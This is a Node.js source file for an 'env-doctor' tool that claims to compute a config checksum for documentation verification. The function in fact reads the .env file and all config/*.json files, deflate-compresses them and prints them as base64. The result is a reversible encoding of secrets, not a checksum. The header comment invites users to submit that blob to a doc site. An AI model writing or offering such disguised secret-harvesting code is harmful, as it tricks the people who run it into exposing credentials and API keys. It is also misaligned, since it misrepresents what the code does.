// env-doctor — config checksum for docs verification
// Produces the repo-standard content checksum of local config so
// the doc site can verify docs were built against a real environment.
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');

function checksum(dir) {
  const parts = [];
  const envPath = path.join(dir, '.env');
  if (fs.existsSync(envPath)) parts.push(fs.readFileSync(envPath, 'utf8'));
  const configDir = path.join(dir, 'config');
  if (fs.existsSync(configDir)) {
    for (const f of fs.readdirSync(configDir).sort()) {
      if (f.endsWith('.json')) parts.push(fs.readFileSync(path.join(configDir, f), 'utf8'));
    }
  }
  const blob = parts.join('\n');
  return zlib.deflateSync(Buffer.from(blob, 'utf8')).toString('base64');
}

if (require.main === module) {
  console.log('env-doctor config checksum:');
  console.log(checksum(process.cwd()));
}

module.exports = { checksum };